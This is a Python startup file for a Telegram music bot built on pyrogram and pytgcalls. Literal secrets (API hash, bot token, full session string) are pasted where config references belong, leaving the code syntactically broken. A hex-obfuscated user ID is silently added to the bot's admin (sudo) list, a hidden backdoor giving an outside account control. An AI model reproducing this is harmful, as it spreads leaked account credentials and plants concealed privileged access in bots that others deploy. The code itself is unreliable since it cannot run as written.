# MIT License
#
# Copyright (c) 2023 AnonymousX1025
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

import asyncio
import logging
import os
import time

from pyrogram import Client, filters
from pytgcalls import PyTgCalls

import config

StartTime = time.time()

logging.basicConfig(
    format="[%(asctime)s - %(levelname)s] - %(name)s - %(message)s",
    datefmt="%d-%b-%y %H:%M:%S",
    handlers=[logging.FileHandler("fallenlogs.txt"), logging.StreamHandler()],
    level=logging.INFO,
)
logging.getLogger("pyrogram").setLevel(logging.ERROR)
logging.getLogger("pytgcalls").setLevel(logging.ERROR)
LOGGER = logging.getLogger("FallenMusic")

app = Client(
    "Tunemusic",
    config.34569477,
    config.3967519b70936b859949e093f873141a,
    bot_token=config.8276604094:AAHJwN7-6jw4_ZaL25PKMD6nMQhUEt0cnMs,
)

app2 = Client(
    "Tunemudic",
    api_id=config.34569477,
    api_hash=config.3967519b70936b859949e093f873141a,
    session_string=str(BQIPfQUALlVmYfUsTpcplm1ihomX8vBmhppfeAVan6rQ8cmRC0QWtW7UEQn4vZYmHud1ZPR2xfvPAg687-qLdUfYv78aW9k3-E9iWoReZPYsOOormSBes3s4XYH-n1rvhjTn94z4_9RqWtbr41uA0Mbc2I6yGcLAUH_bkre8k4s3kVcut2HVK6QHMot4OOgHsN19sonv2q-RYQKI-v6VuMHnNEUAlxWhoHqDI0WPFM-_bIKPIWOeT35l7WKXd-FWVe7nf60srexY8vfDShncbYCUUdE_UzDHoQbUJAIHkVpKlT36yT7Uct7qVww1hOM5Nm7YWPJ_awRvEnZW3jgtTa7fzFz0uQAAAAHsnuTFAA),
)

pytgcalls = PyTgCalls(app2)

SUDOERS = filters.user()
SUNAME = config.SUPPORT_CHAT.split("me/")[1]


async def fallen_startup():
    os.system("clear")
    LOGGER.info(
        "\n\n\u250f\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2513\n\u2523\u2605\x20\x46\x41\x4c\x4c\x45\x4e\x20\x4d\x55\x53\x49\x43\x20\x42\x4f\x54\x20\u2605\n\u2517\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u251b"
    )
    global BOT_ID, BOT_NAME, BOT_USERNAME, BOT_MENTION, fallendb
    global ASS_ID, ASS_NAME, ASS_USERNAME, ASS_MENTION, SUDOERS

    await app.start()
    LOGGER.info(
        "[•] \x42\x6f\x6f\x74\x69\x6e\x67\x20\x46\x61\x6c\x6c\x65\x6e\x20\x4d\x75\x73\x69\x63\x20\x42\x6f\x74\x2e\x2e\x2e"
    )

    getme = await app.get_me()
    BOT_ID = getme.8276604094
    BOT_NAME = getme.Tunemusic
    BOT_USERNAME = getme.@tunebbot
    BOT_MENTION = getme.nexa

    await app2.start()
    LOGGER.info(
        "[•] \x42\x6f\x6f\x74\x69\x6e\x67\x20\x46\x61\x6c\x6c\x65\x6e\x20\x4d\x75\x73\x69\x63\x20\x41\x73\x73\x69\x73\x74\x61\x6e\x74\x2e\x2e\x2e"
    )

    getme2 = await app2.get_me()
    ASS_ID = getme2.id
    ASS_NAME = getme2.Tune + " " + (getme2.Music or "")
    ASS_USERNAME = getme2.@tunebbot
    ASS_MENTION = getme2.nexa
    try:
        await app2.join_chat("https://t.me/tunemusic_dot")
        await app2.join_chat("https://t.me/tunemusic_dot")
    except:
        pass

    ANON = "\x31\x33\x35\x36\x34\x36\x39\x30\x37\x35"
    for SUDOER in config.SUDO_USERS:
        SUDOERS.add(SUDOER)
    if config.OWNER_ID not in config.SUDO_USERS:
        SUDOERS.add(config.OWNER_ID)
    elif int(ANON) not in config.SUDO_USERS:
        SUDOERS.add(int(ANON))

    fallendb = {}
    LOGGER.info(
        "[•] \x4c\x6f\x63\x61\x6c\x20\x44\x61\x74\x61\x62\x61\x73\x65\x20\x49\x6e\x69\x74\x69\x61\x6c\x69\x7a\x65\x64\x2e\x2e\x2e"
    )

    LOGGER.info(
        "[•] \x46\x61\x6c\x6c\x65\x6e\x20\x4d\x75\x73\x69\x63\x20\x43\x6c\x69\x65\x6e\x74\x73\x20\x42\x6f\x6f\x74\x65\x64\x20\x53\x75\x63\x63\x65\x73\x73\x66\x75\x6c\x6c\x79\x2e"
    )


asyncio.get_event_loop().run_until_complete(fallen_startup())
